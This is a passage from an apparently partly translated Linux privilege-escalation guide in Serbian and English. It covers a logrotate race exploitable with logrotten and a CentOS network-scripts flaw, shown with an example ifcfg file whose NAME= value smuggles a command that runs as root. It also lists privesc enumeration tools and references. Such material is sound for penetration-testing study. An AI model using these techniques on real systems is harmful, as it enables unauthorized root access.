Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ovu ranjivost možete iskoristiti pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** tako da kad god otkrijete da možete menjati logove, proverite ko upravlja tim logovima i proverite da li možete da eskalirate privilegije zamenom logova simboličkim linkovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Napomena: prazan razmak između Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` je dom **skripti** za System V init (SysVinit), **klasičan Linux sistem za upravljanje servisima**. Sadrži skripte za `start`, `stop`, `restart` i ponekad `reload` servisa. One se mogu izvršiti direktno ili preko simboličkih linkova koji se nalaze u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

Sa druge strane, `/etc/init` je vezano za **Upstart**, noviji **sistem za upravljanje servisima** koji je predstavio Ubuntu i koji koristi konfiguracione fajlove za upravljanje servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog sloja kompatibilnosti u Upstart-u.

**systemd** predstavlja moderan init i menadžer servisa, nudeći napredne funkcije kao što su pokretanje demona po potrebi, upravljanje automount-ovima i snimanje stanja sistema. Organizira fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene od strane administratora, pojednostavljujući administraciju sistema.

## Ostali trikovi

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks često hookuju syscall da izlože privilegovanu kernel funkcionalnost userspace manageru. Slaba autentifikacija managera (npr. provere potpisa zasnovane na FD-order ili loši password schemes) može omogućiti lokalnoj aplikaciji da se predstavi kao manager i eskalira privilegije do root na već-rootovanim uređajima. Saznajte više i detalje eksploatacije ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Reference

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
